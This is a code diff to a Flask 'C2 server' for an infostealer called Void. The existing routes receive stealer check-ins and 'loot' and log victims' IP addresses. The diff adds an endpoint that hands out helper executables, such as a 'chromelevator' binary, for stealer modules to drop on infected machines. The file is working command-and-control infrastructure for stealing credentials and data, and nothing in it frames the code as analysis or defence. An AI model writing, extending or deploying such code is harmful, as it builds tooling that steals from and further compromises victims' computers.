@@ -1,5 +1,5 @@
 """Void C2 server - receives stealer check-ins and loot. Run on your VPS."""
-import os, json, datetime
+import os, json, datetime, re
 from flask import Flask, request, jsonify, send_from_directory
 
 app = Flask(__name__)
@@ -96,6 +96,18 @@ def mod_submit():
                              "ip": request.remote_addr, "size": len(str(data))}) + "\n")
     log(f"mod loot from {uid}")
     return jsonify({"status": "ok"})
+
+@app.route("/mod/tool", methods=["GET"])
+def mod_tool():
+    """Helper binaries for lab mods (e.g. ?name=chromelevator_x64.exe).
+    Served over the pinned channel; mod drops them next to the payload."""
+    name = request.args.get("name", "")
+    if not re.match(r"^[A-Za-z0-9_.-]{1,64}$", name):
+        return jsonify({"status": "bad-name"}), 400
+    path = os.path.join(os.path.dirname(os.path.abspath(__file__)), name)
+    if not os.path.isfile(path):
+        return jsonify({"status": "no-tool"}), 404
+    return send_from_directory(os.path.dirname(path), name)
 
 @app.route("/mod/checkin", methods=["POST"])
 def mod_checkin():
